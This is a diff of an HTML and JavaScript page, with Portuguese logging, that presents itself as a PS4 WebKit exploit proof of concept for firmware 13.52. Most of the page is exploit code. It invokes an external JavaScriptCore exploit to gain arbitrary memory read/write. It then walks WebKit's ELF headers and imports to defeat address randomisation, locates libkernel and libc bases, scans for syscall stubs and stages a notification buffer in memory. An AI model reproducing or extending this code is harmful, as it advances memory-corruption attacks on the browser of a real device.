@@ -1,9 +1,10 @@
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>PS4 WebKit Exploit (13.52 — Notification PoC)</title>
+<title>PS4 WebKit Exploit (13.52 — Notification P)</title>
 <style>
 *{margin:0;padding:0;box-sizing:border-box}
 body{background:#060810;color:#c8cfd8;font:13px/1.5 'Courier New',monospace;
@@ -23,7 +24,6 @@ h1{font-size:15px;color:#00c8ff;letter-spacing:3px;text-transform:uppercase;
 #bars{width:100%;max-width:720px;display:flex;justify-content:space-between;
   font-size:10px;color:#333;margin-bottom:8px;padding:0 2px}
 
-/* console */
 #con{width:100%;max-width:720px;height:260px;background:#050508;
   border:1px solid #161825;border-radius:6px;overflow-y:auto;
   padding:8px 10px;font-size:11px;line-height:1.65;margin-bottom:8px}
@@ -32,7 +32,6 @@ h1{font-size:15px;color:#00c8ff;letter-spacing:3px;text-transform:uppercase;
 .s{color:#00c8ff;border-top:1px solid #161825;margin-top:5px;
   padding-top:5px;letter-spacing:1px}.f{color:#a78bfa;font-weight:bold}
 
-/* cards */
 #cards{width:100%;max-width:720px;display:grid;
   grid-template-columns:1fr 1fr;gap:6px;margin-bottom:8px}
 .card{background:#0b0d1a;border:1px solid #1a1d2e;border-radius:5px;padding:8px 12px}
@@ -40,7 +39,6 @@ h1{font-size:15px;color:#00c8ff;letter-spacing:3px;text-transform:uppercase;
 .card .cv{font-size:12px;color:#bd93f9}
 .card .cv.na{color:#222}
 
-/* constants output box */
 #cbox{width:100%;max-width:720px;background:#03100a;border:2px solid #00c853;
   border-radius:6px;padding:12px;display:none;margin-bottom:8px;
   font-size:11px;line-height:1.6;color:#4ade80;white-space:pre-wrap;word-break:break-all}
@@ -65,7 +63,6 @@ h1{font-size:15px;color:#00c8ff;letter-spacing:3px;text-transform:uppercase;
 
 <div id="con"></div>
 
-<!-- Base cards -->
 <div id="cards">
   <div class="card"><div class="cl">WebKit Base</div><div class="cv na" id="c-wk">—</div></div>
   <div class="card"><div class="cl">libkernel Base</div><div class="cv na" id="c-lk">—</div></div>
@@ -73,7 +70,6 @@ h1{font-size:15px;color:#00c8ff;letter-spacing:3px;text-transform:uppercase;
   <div class="card"><div class="cl">Status Notificação</div><div class="cv na" id="c-g">Aguardando</div></div>
 </div>
 
-<!-- Constants output box -->
 <div id="cbox">
   <div class="ct">// ═══════ STATUS DA NOTIFICAÇÃO (13.52) ═══════</div>
   <div id="c-out"></div>
@@ -109,27 +105,29 @@ function setCard(id, v) {
   el.textContent = v; el.classList.remove('na');
 }
 
-// ═════════════════════════════════════════════════════════════════════════════
-// RESOLUÇÃO DINÂMICA DE BASES VIA PARSING ELF (SEM HARDCODED)
-// ═════════════════════════════════════════════════════════════════════════════
+/* mem.js: read1/read2/read4/read8 — aliases para o codigo original */
+function patchPrim(p) {
+  if (!p.read32 && p.read4) p.read32 = function(a){ return p.read4(a); };
+  if (!p.read16 && p.read2) p.read16 = function(a){ return p.read2(a); };
+  if (!p.read64 && p.read8) p.read64 = function(a){ return p.read8(a); };
+  return p;
+}
 
 async function resolveAllBases(p, webkitBase) {
   logH('PARSING ELF DO WEBKIT');
 
-  // ─── Passo 1: Verificar ELF magic ───
   let magic = p.read32(webkitBase);
   if (magic !== 0x464C457F) {
-    log('[-] WebKit base não aponta para ELF válido! magic=0x' + magic.toString(16), 'e');
+    log('[-] WebKit base sem ELF magic! magic=0x' + (magic>>>0).toString(16), 'e');
+    log('[!] Em SPRX o header ELF NAO fica no loadBase (LOAD começa em file+0x4000).', 'w');
     return null;
   }
-  log('[+] ELF magic válido (\\x7fELF)');
+  log('[+] ELF magic valido');
 
-  // ─── Passo 2: Ler program headers ───
   let phoff = p.read64(webkitBase.add32(0x20));
   let phnum = p.read16(webkitBase.add32(0x38));
   log('[+] Program headers: ' + phnum + ' entries, offset=0x' + phoff.toString(16));
 
-  // ─── Passo 3: Encontrar PT_DYNAMIC ───
   let dynamicVaddr = null;
   let dynamicSize = 0;
   for (let i = 0; i < phnum; i++) {
@@ -143,11 +141,10 @@ async function resolveAllBases(p, webkitBase) {
     }
   }
   if (!dynamicVaddr) {
-    log('[-] PT_DYNAMIC não encontrado', 'e');
+    log('[-] PT_DYNAMIC nao encontrado', 'e');
     return null;
   }
 
-  // ─── Passo 4: Parsear entradas dynamic ───
   let strtab = null, symtab = null, jmprel = null, pltrelsz = 0;
   for (let off = 0; off < dynamicSize; off += 16) {
     let entry = dynamicVaddr.add32(off);
@@ -163,7 +160,6 @@ async function resolveAllBases(p, webkitBase) {
   log('[+] symtab=0x' + (symtab ? symtab.toString(16) : 'null'));
   log('[+] jmprel=0x' + (jmprel ? jmprel.toString(16) : 'null') + ' pltrelsz=' + pltrelsz);
 
-  // ─── Passo 5: Varredura de imports ───
   let imports = {};
   let numRela = Math.floor(pltrelsz / 24);
   log('[+] Varrendo ' + numRela + ' entradas RELA...');
@@ -177,7 +173,7 @@ async function resolveAllBases(p, webkitBase) {
     let st_name = p.read32(symtab.add32(symIdx * 24));
     let name = '';
     for (let j = 0; j < 128; j++) {
-      let ch = p.read8(strtab.add32(st_name + j));
+      let ch = p.read1(strtab.add32(st_name + j));
       if (ch === 0) break;
       name += String.fromCharCode(ch);
     }
@@ -190,7 +186,6 @@ async function resolveAllBases(p, webkitBase) {
   }
   log('[+] ' + Object.keys(imports).length + ' imports parseados');
 
-  // ─── Passo 6: Logar imports úteis ───
   let useful = ['memset','memcpy','strcmp','strlen','pthread_create',
                 '__stack_chk_guard','sceKernelDlsym','sceKernelSendNotificationRequest',
                 'sceKernelGetpid','sceKernelUsleep'];
@@ -200,7 +195,6 @@ async function resolveAllBases(p, webkitBase) {
     }
   }
 
-  // ─── Passo 7: Encontrar bases varrendo para trás ───
   let libkernelBase = null;
   let libcBase = null;
 
@@ -216,7 +210,6 @@ async function resolveAllBases(p, webkitBase) {
     return null;
   }
 
-  // libkernel: usar __stack_chk_guard ou sceKernelGetpid
   let lkRef = imports['__stack_chk_guard'] || imports['sceKernelGetpid'] || imports['sceKernelUsleep'];
   if (lkRef) {
     libkernelBase = findElfBase(p, lkRef.importPtr, 0x200000);
@@ -224,136 +217,114 @@ async function resolveAllBases(p, webkitBase) {
       log('[+] libkernel base encontrada: 0x' + libkernelBase.toString(16), 'ok');
       setCard('c-lk', '0x' + libkernelBase.toString(16));
     } else {
-      log('[-] Não foi possível encontrar base da libkernel', 'w');
+      log('[-] Nao foi possivel encontrar base da libkernel', 'w');
     }
   }
 
-  // libc: usar memset
   if (imports['memset']) {
     libcBase = findElfBase(p, imports['memset'].importPtr, 0x200000);
     if (libcBase) {
       log('[+] libc base encontrada: 0x' + libcBase.toString(16), 'ok');
       setCard('c-lc', '0x' + libcBase.toString(16));
     } else {
-      log('[-] Não foi possível encontrar base da libc', 'w');
+      log('[-] Nao foi possivel encontrar base da libc', 'w');
     }
   }
 
   return { imports, libkernelBase, libcBase };
 }
 
-// ═════════════════════════════════════════════════════════════════════════════
-// VALIDAÇÃO DE BASES (testes para confirmar se estão corretas)
-// ═════════════════════════════════════════════════════════════════════════════
-
 async function validateBases(p, libkernelBase, libcBase) {
   logH('VALIDANDO BASES');
   let valid = { libkernel: false, libc: false };
 
-  // ─── Teste 1: ELF magic na base ───
   if (libkernelBase) {
     let magic = p.read32(libkernelBase);
     if (magic === 0x464C457F) {
-      log('[✓] libkernel: ELF magic válido', 'ok');
+      log('[OK] libkernel: ELF magic valido', 'ok');
       valid.libkernel = true;
     } else {
-      log('[✗] libkernel: ELF magic inválido (0x' + magic.toString(16) + ')', 'e');
+      log('[X] libkernel: ELF magic invalido (0x' + (magic>>>0).toString(16) + ')', 'e');
     }
   }
 
   if (libcBase) {
     let magic = p.read32(libcBase);
     if (magic === 0x464C457F) {
-      log('[✓] libc: ELF magic válido', 'ok');
+      log('[OK] libc: ELF magic valido', 'ok');
       valid.libc = true;
     } else {
-      log('[✗] libc: ELF magic inválido (0x' + magic.toString(16) + ')', 'e');
+      log('[X] libc: ELF magic invalido (0x' + (magic>>>0).toString(16) + ')', 'e');
     }
   }
 
-  // ─── Teste 2: Assinatura de stub de syscall ───
-  // Stubs da libkernel seguem o padrão:
-  //   mov rax, <syscall#>  → 48 C7 C0 XX XX XX XX
-  //   mov r10, rcx         → 49 89 CA
-  //   syscall              → 0F 05
-  //   ret                  → C3
   if (libkernelBase && valid.libkernel) {
-    // Varredura nos primeiros 0x100000 bytes procurando stubs
     let foundStubs = 0;
     for (let off = 0; off < 0x100000; off += 0x10) {
       try {
-        let b0 = p.read8(libkernelBase.add32(off));
-        let b1 = p.read8(libkernelBase.add32(off + 1));
-        let b2 = p.read8(libkernelBase.add32(off + 2));
+        let b0 = p.read1(libkernelBase.add32(off));
+        let b1 = p.read1(libkernelBase.add32(off + 1));
+        let b2 = p.read1(libkernelBase.add32(off + 2));
         if (b0 === 0x48 && b1 === 0xC7 && b2 === 0xC0) {
-          let b7 = p.read8(libkernelBase.add32(off + 7));
-          let b8 = p.read8(libkernelBase.add32(off + 8));
-          let b9 = p.read8(libkernelBase.add32(off + 9));
+          let b7 = p.read1(libkernelBase.add32(off + 7));
+          let b8 = p.read1(libkernelBase.add32(off + 8));
+          let b9 = p.read1(libkernelBase.add32(off + 9));
           if (b7 === 0x49 && b8 === 0x89 && b9 === 0xCA) {
             foundStubs++;
-            if (foundStubs >= 3) break; // achou 3 stubs, suficiente
+            if (foundStubs >= 3) break;
           }
         }
       } catch(e) {}
     }
     if (foundStubs >= 3) {
-      log('[✓] libkernel: ' + foundStubs + ' stubs de syscall encontrados', 'ok');
+      log('[OK] libkernel: ' + foundStubs + ' stubs de syscall', 'ok');
     } else {
-      log('[✗] libkernel: poucos stubs de syscall (' + foundStubs + ')', 'w');
+      log('[X] libkernel: poucos stubs (' + foundStubs + ')', 'w');
       valid.libkernel = false;
     }
   }
 
-  // ─── Teste 3: Verificar se memset aponta para código válido ───
   if (imports && imports['memset'] && libcBase && valid.libc) {
     let memsetPtr = imports['memset'].importPtr;
-    // memset na libc geralmente começa com push rbp ou similar
-    let b0 = p.read8(memsetPtr);
-    // Código válido x86_64 geralmente não começa com 0x00, 0xCC, etc.
+    let b0 = p.read1(memsetPtr);
     if (b0 !== 0x00 && b0 !== 0xCC && b0 !== 0xFF) {
-      log('[✓] libc: memset aponta para código válido (0x' + b0.toString(16) + ')', 'ok');
+      log('[OK] libc: memset codigo valido (0x' + b0.toString(16) + ')', 'ok');
     } else {
-      log('[✗] libc: memset aponta para código suspeito (0x' + b0.toString(16) + ')', 'w');
+      log('[X] libc: memset suspeito (0x' + b0.toString(16) + ')', 'w');
     }
   }
 
-  // ─── Teste 4: Verificar consistência de page alignment ───
   if (libkernelBase) {
     let aligned = (libkernelBase.low & 0xFFF) === 0;
-    log(aligned ? '[✓] libkernel: alinhada a página (0x1000)' : '[✗] libkernel: NÃO alinhada a página', aligned ? 'ok' : 'w');
+    log(aligned ? '[OK] libkernel alinhada' : '[X] libkernel NAO alinhada', aligned ? 'ok' : 'w');
     if (!aligned) valid.libkernel = false;
   }
   if (libcBase) {
     let aligned = (libcBase.low & 0xFFF) === 0;
-    log(aligned ? '[✓] libc: alinhada a página (0x1000)' : '[✗] libc: NÃO alinhada a página', aligned ? 'ok' : 'w');
+    log(aligned ? '[OK] libc alinhada' : '[X] libc NAO alinhada', aligned ? 'ok' : 'w');
     if (!aligned) valid.libc = false;
   }
 
   return valid;
 }
 
-// ═════════════════════════════════════════════════════════════════════════════
-// PREPARAÇÃO DO BUFFER DE NOTIFICAÇÃO (sem hardcoded offset)
-// ═════════════════════════════════════════════════════════════════════════════
-
 function prepareNotification(p, libkernelBase, imports, text) {
-  logH('PREPARANDO BUFFER DE NOTIFICAÇÃO');
+  logH('PREPARANDO BUFFER DE NOTIFICACAO');
 
-  // Pegar offset dinâmico do import
   let notifyImport = imports['sceKernelSendNotificationRequest'];
   if (!notifyImport) {
-    log('[-] sceKernelSendNotificationRequest não encontrado nos imports!', 'e');
+    log('[-] sceKernelSendNotificationRequest nao encontrado!', 'e');
     return null;
   }
 
   let notifyFunc = notifyImport.importPtr;
-  log('[+] Endereço alvo da API: 0x' + notifyFunc.toString(16));
+  log('[+] Endereco alvo da API: 0x' + notifyFunc.toString(16));
 
   let encoder = new TextEncoder();
   let msgBytes = encoder.encode(text + '\x00');
 
   let buf = new Uint8Array(0x400);
-  buf[4] = 0; // userId = 0
+  buf[4] = 0;
   buf.set(msgBytes, 0x20);
 
   let arrCell = p.leakval(buf);
@@ -362,7 +333,7 @@ function prepareNotification(p, libkernelBase, imports, text) {
   p.write8(backingStore.add32(0x8), backingStore.add32(0x20));
   p.write4(backingStore.add32(0x10), msgBytes.length);
 
-  log('[+] Buffer alocado com sucesso em: 0x' + backingStore.toString(16), 'ok');
+  log('[+] Buffer alocado em: 0x' + backingStore.toString(16), 'ok');
 
   return {
     notifyFunc,
@@ -370,16 +341,12 @@ function prepareNotification(p, libkernelBase, imports, text) {
   };
 }
 
-// ═════════════════════════════════════════════════════════════════════════════
-// MAIN
-// ═════════════════════════════════════════════════════════════════════════════
-
-let imports = null; // global para validação
+let imports = null;
 
 async function main() {
   const ua = navigator.userAgent;
   const fw = /PlayStation 4\/(\d+\.\d+)/.exec(ua);
-  $fw.textContent = fw ? `PlayStation 4 — firmware ${fw[1]}` : `UA: ${ua.slice(0, 40)}`;
+  $fw.textContent = fw ? 'PlayStation 4 — firmware ' + fw[1] : 'UA: ' + ua.slice(0, 40);
   log('UA: ' + ua, 'd');
 
   setStatus('Rodando exploit JSC (core.js)...', 'r');
@@ -390,8 +357,8 @@ async function main() {
     carrier = await establishPrimitive({
       onEvent: (tag, detail, attempt) => {
         document.getElementById('ba').textContent = 'tentativa: ' + (attempt || 1);
-        document.getElementById('bg').textContent = 'estágio: ' + tag.toLowerCase();
-        log(`[${tag}] ${detail}`, 'i');
+        document.getElementById('bg').textContent = 'estagio: ' + tag.toLowerCase();
+        log('[' + tag + '] ' + detail, 'i');
       },
       maxAttempts: 0
     });
@@ -401,8 +368,8 @@ async function main() {
     return;
   }
 
-  log('[+] core.js: exploit JSC concluído!', 'ok');
-  setStatus('Instalando R/W arbitrário...', 'r');
+  log('[+] core.js: exploit JSC concluido!', 'ok');
+  setStatus('Instalando R/W arbitrario...', 'r');
   logH('INSTALANDO PRIMITIVA R/W (mem.js)');
 
   let p;
@@ -410,7 +377,7 @@ async function main() {
     p = installWindowP(carrier, {
       promote: true,
       onEvent: (tag, detail) => {
-        log(`  [mem/${tag}] ${detail}`, 'd');
+        log('  [mem/' + tag + '] ' + detail, 'd');
       }
     });
   } catch (err) {
@@ -419,7 +386,9 @@ async function main() {
     return;
   }
 
-  log('[+] R/W arbitrário: window.p instalado com sucesso!', 'ok');
+  p = patchPrim(p);
+
+  log('[+] R/W arbitrario: window.p instalado com sucesso!', 'ok');
   setStatus('Mapeando bases com estabilidade...', 'r');
   logH('MAPEAMENTO DA 13.52');
 
@@ -444,10 +413,9 @@ async function main() {
     setCard('c-wk', '0x' + webkitBase.toString(16));
 
     setTimeout(async () => {
-      // ─── Resolver bases via ELF parsing ───
       const result = await resolveAllBases(p, webkitBase);
       if (!result) {
-        setStatus('Falha na resolução de bases', 'e');
+        setStatus('Falha na resolucao de bases (sem ELF magic — esperado em SPRX)', 'e');
         return;
       }
 
@@ -455,16 +423,15 @@ async function main() {
       const libKernelBase = result.libkernelBase;
       const libcBase = result.libcBase;
 
-      // ─── Validar bases ───
       const valid = await validateBases(p, libKernelBase, libcBase);
 
       if (!valid.libkernel) {
-        setCard('c-lk', 'Falha na validação');
-        log('[-] libkernel base não passou na validação', 'e');
+        setCard('c-lk', 'Falha na validacao');
+        log('[-] libkernel base nao passou na validacao', 'e');
       }
       if (!valid.libc) {
-        setCard('c-lc', 'Falha na validação');
-        log('[-] libc base não passou na validação', 'e');
+        setCard('c-lc', 'Falha na validacao');
+        log('[-] libc base nao passou na validacao', 'e');
       }
 
       if (valid.libkernel) {
@@ -472,8 +439,8 @@ async function main() {
           const notif = prepareNotification(p, libKernelBase, imports, 'Hello World from PS4 13.52!');
           if (notif) {
             setCard('c-g', 'Pronto');
-            setStatus('Buffer de notificação pronto!', 'ok');
-            log('[✓] Configuração de notificação concluída com sucesso.', 'ok');
+            setStatus('Buffer de notificacao pronto!', 'ok');
+            log('[OK] Configuracao de notificacao concluida.', 'ok');
 
             const cbox = document.getElementById('cbox');
             cbox.style.display = 'block';
@@ -482,30 +449,29 @@ async function main() {
                 'libkernel Base  = 0x' + (libKernelBase ? libKernelBase.toString(16) : 'N/A') + '\n' +
                 'libSceLibc Base = ' + (libcBase ? '0x' + libcBase.toString(16) : 'N/A') + '\n' +
                 'Buffer Notif    = 0x' + notif.requestBuffer.toString(16) + '\n' +
-                'Função Target   = 0x' + notif.notifyFunc.toString(16) + '\n' +
+                'Funcao Target   = 0x' + notif.notifyFunc.toString(16) + '\n' +
                 'Notify Offset   = 0x' + (imports['sceKernelSendNotificationRequest'] ? imports['sceKernelSendNotificationRequest'].wkOffset.toString(16) : 'N/A');
 
-            // ─── NOTIFICAÇÃO: stub honesto (sem simulação) ───
-            logH('NOTIFICAÇÃO');
-            log('[+] Offset dinâmico de sceKernelSendNotificationRequest: 0x' + imports['sceKernelSendNotificationRequest'].wkOffset.toString(16), 'i');
-            log('[!] Execução nativa requer ROP chain ou JIT pivot (não implementado)', 'w');
-            log('[!] Status: userland R/W ativo. Kernel exploit necessário para execução real.', 'w');
+            logH('NOTIFICACAO');
+            log('[+] Offset dinamico de sceKernelSendNotificationRequest: 0x' + imports['sceKernelSendNotificationRequest'].wkOffset.toString(16), 'i');
+            log('[!] Execucao nativa requer ROP chain ou JIT pivot (nao implementado)', 'w');
+            log('[!] Status: userland R/W ativo. Kernel exploit necessario para execucao real.', 'w');
 
           } else {
             setCard('c-g', 'Falha');
-            log('[-] Falha ao preparar buffer de notificação', 'e');
+            log('[-] Falha ao preparar buffer de notificacao', 'e');
           }
         } catch (e) {
           log('[-] Erro ao preparar buffer: ' + e.message, 'e');
         }
       } else {
         setCard('c-g', 'Falha LK');
-        log('[-] Não foi possível resolver a libkernel para o buffer.', 'e');
+        log('[-] Nao foi possivel resolver a libkernel para o buffer.', 'e');
       }
     }, 1000);
 
   } else {
-    log('[-] Falha: __ps5NativeCtor não foi capturado corretamente.', 'e');
+    log('[-] Falha: __ps5NativeCtor nao foi capturado corretamente.', 'e');
     setStatus('Erro ao capturar NativeCtor', 'e');
   }
 }
